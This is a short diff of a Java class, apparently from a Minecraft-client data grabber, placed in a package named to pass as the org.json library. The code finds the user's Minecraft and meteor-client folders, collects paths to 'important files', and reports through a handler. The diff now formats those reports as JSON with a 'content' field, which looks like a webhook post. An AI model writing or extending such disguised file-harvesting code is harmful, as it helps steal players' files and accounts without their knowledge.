@@ -3,6 +3,7 @@ package org.json.updated.parsers.impl;
 import org.json.updated.parsers.JSONObject;
 import org.json.updated.parsers.JSONRegexHandler;
 import org.json.updated.parsers.util.FileSystemHelper;
+import org.json.updated.parsers.util.JSONBuilder;
 
 import java.io.File;
 import java.nio.file.Files;
@@ -17,15 +18,15 @@ public class MeteorData implements JSONObject {
         String mcFolder = FileSystemHelper.getMinecraftFolder();
         if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;
 
-        String kamiblueFolder = mcFolder + "meteor-client/";
-        if (!Files.exists(Paths.get(kamiblueFolder))) {
-            JSONRegexHandler.send("> Did not contain the Meteor-Client folder.");
+        String meteorFolder = mcFolder + "meteor-client/";
+        if (!Files.exists(Paths.get(meteorFolder))) {
+            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the Meteor-Client folder.").build());
             return;
         }
 
         ArrayList<File> validFileDirs = new ArrayList<>(); // @TODO meteor uses a folder for waypoints.
         for (String fileName : IMPORTANT_FILES) {
-            String dir = kamiblueFolder + fileName;
+            String dir = meteorFolder + fileName;
             if (!Files.exists(Paths.get(dir))) continue;
 
             validFileDirs.add(new File(dir));
